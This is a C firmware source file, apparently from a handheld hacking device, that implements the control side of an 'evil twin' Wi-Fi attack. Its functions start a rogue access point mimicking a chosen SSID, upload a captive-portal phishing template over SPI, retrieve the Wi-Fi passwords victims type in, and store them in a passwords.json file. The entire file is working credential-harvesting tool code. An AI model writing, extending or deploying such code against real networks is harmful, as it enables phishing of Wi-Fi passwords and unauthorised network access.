// Copyright (c) 2025 HIGH CODE LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.


#include "evil_twin.h"
#include "spi_bridge.h"
#include "tos_storage_paths.h"
#include "storage_read.h"
#include "storage_write.h"
#include "storage_assets.h"
#include "cJSON.h"
#include "esp_log.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

static const char *TAG = "EVIL_TWIN_BACKEND";
static bool has_password = false;

void evil_twin_start_attack(const char *ssid) {
    if (!ssid) return;
    size_t len = strnlen(ssid, 32);
    if (spi_bridge_send_command(SPI_ID_WIFI_APP_EVIL_TWIN, (uint8_t*)ssid, (uint8_t)len, NULL, NULL, 2000) == ESP_OK) {
        has_password = false;
    } else {
        ESP_LOGW(TAG, "Failed to start Evil Twin over SPI.");
    }
}

void evil_twin_start_attack_with_template(const char *ssid, const char *template_path) {
    if (!ssid) return;
    size_t ssid_len = strnlen(ssid, 32);
    size_t tmpl_len = template_path ? strnlen(template_path, 127) : 0;
    if (ssid_len == 0) return;
    if (tmpl_len > 127) tmpl_len = 127;

    uint8_t payload[1 + 32 + 1 + 127];
    payload[0] = (uint8_t)ssid_len;
    memcpy(payload + 1, ssid, ssid_len);
    payload[1 + ssid_len] = (uint8_t)tmpl_len;
    if (tmpl_len > 0) {
        memcpy(payload + 1 + ssid_len + 1, template_path, tmpl_len);
    }
    if (spi_bridge_send_command(SPI_ID_WIFI_EVIL_TWIN_TEMPLATE, payload, (uint8_t)(1 + ssid_len + 1 + tmpl_len), NULL, NULL, 2000) == ESP_OK) {
        has_password = false;
    } else {
        ESP_LOGW(TAG, "Failed to start Evil Twin (template) over SPI.");
    }
}

void evil_twin_stop_attack(void) {
    spi_bridge_send_command(SPI_ID_WIFI_APP_ATTACK_STOP, NULL, 0, NULL, NULL, 2000);
}

void evil_twin_reset_capture(void) {
    spi_bridge_send_command(SPI_ID_WIFI_EVIL_TWIN_RESET_CAPTURE, NULL, 0, NULL, NULL, 2000);
    has_password = false;
}

bool evil_twin_has_password(void) {
    spi_header_t resp;
    uint8_t payload[1] = {0};
    if (spi_bridge_send_command(SPI_ID_WIFI_EVIL_TWIN_HAS_PASSWORD, NULL, 0, &resp, payload, 1000) == ESP_OK) {
        has_password = (payload[0] != 0);
    }
    return has_password;
}

void evil_twin_get_last_password(char *out, size_t len) {
    if (!out || len == 0) return;
    spi_header_t resp;
    uint8_t payload[64] = {0};
    if (spi_bridge_send_command(SPI_ID_WIFI_EVIL_TWIN_GET_PASSWORD, NULL, 0, &resp, payload, sizeof(payload)) == ESP_OK) {
        payload[sizeof(payload) - 1] = '\0';
        strncpy(out, (char*)payload, len - 1);
        out[len - 1] = '\0';
        has_password = (out[0] != '\0');
        return;
    }
    out[0] = '\0';
}

bool evil_twin_upload_template(const char *path) {
    if (!path) return false;

    // Try SD first, then flash assets
    char *html = NULL;
    size_t size = 0;

    FILE *f = fopen(path, "r");
    if (f) {
        fseek(f, 0, SEEK_END);
        size = (size_t)ftell(f);
        fseek(f, 0, SEEK_SET);
        if (size > 0 && size <= 8192) {
            html = malloc(size);
            if (html) fread(html, 1, size, f);
        }
        fclose(f);
    }

    if (!html) {
        html = (char *)storage_assets_load_file(path, &size);
    }

    if (!html || size == 0) {
        ESP_LOGE(TAG, "Failed to read template: %s", path);
        return false;
    }

    // Send BEGIN with total size
    uint8_t begin_payload[2];
    begin_payload[0] = (uint8_t)(size & 0xFF);
    begin_payload[1] = (uint8_t)((size >> 8) & 0xFF);
    if (spi_bridge_send_command(SPI_ID_WIFI_EVIL_TWIN_TMPL_BEGIN, begin_payload, 2, NULL, NULL, 2000) != ESP_OK) {
        free(html);
        ESP_LOGE(TAG, "Template BEGIN failed");
        return false;
    }

    // Send chunks
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = size - offset;
        if (chunk > 252) chunk = 252;
        if (spi_bridge_send_command(SPI_ID_WIFI_EVIL_TWIN_TMPL_CHUNK,
                                    (uint8_t *)(html + offset), (uint8_t)chunk,
                                    NULL, NULL, 2000) != ESP_OK) {
            free(html);
            ESP_LOGE(TAG, "Template CHUNK failed at offset %u", (unsigned)offset);
            return false;
        }
        offset += chunk;
    }

    free(html);
    ESP_LOGI(TAG, "Template uploaded: %u bytes", (unsigned)size);
    return true;
}

void evil_twin_save_password(const char *password) {
    if (!password || password[0] == '\0') return;

    const char *json_path = TOS_PATH_CAPTIVE "/passwords.json";

    cJSON *root = NULL;
    char buf[2048];
    if (storage_read_string(json_path, buf, sizeof(buf)) == ESP_OK) {
        root = cJSON_Parse(buf);
    }
    if (!root) {
        root = cJSON_CreateArray();
    }

    cJSON *entry = cJSON_CreateObject();
    cJSON_AddStringToObject(entry, "password", password);
    cJSON_AddItemToArray(root, entry);

    char *json_str = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);
    if (json_str) {
        storage_write_string(json_path, json_str);
        free(json_str);
        ESP_LOGI(TAG, "Password saved to SD");
    }
}
